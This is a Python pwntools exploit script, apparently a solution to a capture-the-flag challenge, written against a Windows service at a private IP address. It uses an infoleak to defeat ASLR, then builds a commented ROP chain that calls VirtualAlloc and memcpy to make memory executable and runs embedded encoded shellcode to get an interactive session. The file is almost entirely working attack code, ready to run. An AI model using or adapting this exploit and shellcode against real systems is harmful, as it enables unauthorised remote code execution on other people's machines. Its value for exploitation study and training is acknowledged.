from pwn import *

target = remote('192.168.13.1', 9998)

def getMenu():
	target.recvuntil("Selection: ")

def leak():
	getMenu()
	target.sendline("A")
	target.recvuntil("ASLR slide is: ")
	leak = target.recvuntil("and")
	base = int(leak.strip(" and"), 16)
	target.recvuntil("stored at: ")
	leak = target.recvuntil(".")
	stackLeak = int(leak.strip("."), 16)
	return base, stackLeak

target.sendline("GreenhornSecretPassword!!!")

base, stackleak = leak()

pie = base + 0x400000
virtualAlloc = pie + 0x11C0
pop4 = pie + 0x199E
memcpy = pie + 0x11F0
callEax = pie + 0x1C6B

inputBase = stackleak - 0x3f8
newEbp = inputBase + 0x500

log.info("Base is: " + hex(base))
log.info("Stack infoleak: " + hex(stackleak))

target.sendline('V')
print target.recvuntil("constraints).\n\n")

payload = "C"
payload += "0"*0x3ff

# Calculate the address of the start of our rop chain
ropStart = stackleak + 0x4

ropChain = ""

# The start of our rop chain, which is just a value to deal with the `pop ebp`
ropChain += p32(0x30303030)

# Call Virtual Alloc
ropChain += p32(virtualAlloc)

# Pop off the four arguments of virtual alloc off of the rop chain
ropChain += p32(pop4)

# Our 4 Arguments to virtual Alloc

# This is just a place holder value
ropChain += p32(0x31313131)

# Size of the memory space
ropChain += p32(0x400)

# Permissions to our memory region
ropChain += p32(0x40)

# The address in memory where a ptr to the allocated space will be written
# This spot will be where the `p32(0x32323232)` spot in our rop chain is
ropChain += p32(ropStart + 0x28)



# Call Memcpy function
ropChain += p32(memcpy)

# Clean up the arguments
ropChain += p32(pop4)

# Our Arguments to memcpy

# This will hold the address of the allocated memory, which was overwritten durring the virtualalloc winapi call
# This is the address that memcpy will write to
ropChain += p32(0x31313131)

# This holds the address of the data which will be read, which is our shellcode further down the rop chain
ropChain += p32(ropStart + 0x3c)

# This is the amount of bytes which memcpy will write
ropChain += p32(0x400)

# Another value to deal with the `add esp; pop ebp`
ropChain += p32(0x32323232)

# After memcpy is called, the return value (stored in eax) 
# Will be the address that is written to, in other words where our shellcode in executable memory is
# So we just need to call eax to run the shellcode
ropChain += p32(callEax)

# Add our shellcode
shellcode = "\x90\x6A\x53\x90\xbe\x30\x3f\x47\x5c\xda\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x43\x31\x77\x14\x03\x77\x14\x83\xef\xfc\xd2\xca\x2d\x6c\x4c\x51\x39\x8a\xfb\xe9\x31\x18\x8d\x1d\xc1\x58\x61\x1b\xd5\x74\x81\x23\x85\xff\xb7\xa8\x13\x8b\xe1\xbe\x33\x2e\x1a\xbf\xbf\x62\xcc\x28\x3f\x83\x0c\x3f\x2b\xe6\x75\xbf\x22\x0f\xd7\xd7\x34\xd0\xd7\x27\x5d\x50\xd7\x27\x9d\x38\xd4\x27\x9d\xb8\xb2\x27\x9d\xb8\x42\x40\x9c\xb8\x42\x90\xf6\xb8\x42\x90\x86\xee\xbd\x40\xdc\x99\x86\x09\xf7\xfc\xf2\xda\xa5\x16\x62\xdb\x49\xe7\xe3\x37\x49\xe5\xe3\xc7\xc3\x08\xb2\xaf\xd3\xca\x34\x30\x85\x4b\xdd\x30\x27\x4c\x1d\x59\x27\x4e\x1d\x99\x76\x19\xe2\x49\x21\x24\xf5\x6a\xd0\x26\x05\xea\x10\x22\x07\xec\x98\x73\x02\x8c\x9c\x83\x0c\xcd\x71\x8f\x08\xcd\x89\xf8\x10\xcc\x89\xf8\x41\x31\x59\xae\x36\x46\x2e\x6b\xb4\x69\x30\x8f\xf5\x49\x62\x48\x15\x3d\x71\x68\x1a\xb3\x84\xad\x4d\x23\x79\xce\x72\x35\x7e\x6e\xd2\x84\x7b\x91\x8a\x83\xe8\xb5\x6e\x1f\xb5\x89\xe5\x4b\x33\x8a\xf8\x99\xb0\x20\xe2\xd6\x9d\x94\x13\x02\xc2\xff\x5a\x5f\x31\x8b\x5d\xb1\x6c\x63\xe6\xb2\x6e\x8c\x23\x09\xb5\x5b\x26\x7d\x3e\xc1\xec\x7c\xaa\x90\x67\x72\x67\xd6\x2d\x97\x76\x03\x5a\xa3\xf3\xd2\xb4\x45\x01\xd5\x44\x96\x37\x15\xcd\xd2\x13\x89\xac\x18\x53\xb1"

ropChain += shellcode

# Add the ropChain to the payload, and send it
payload = payload + ropChain
target.sendline(payload)

target.interactive()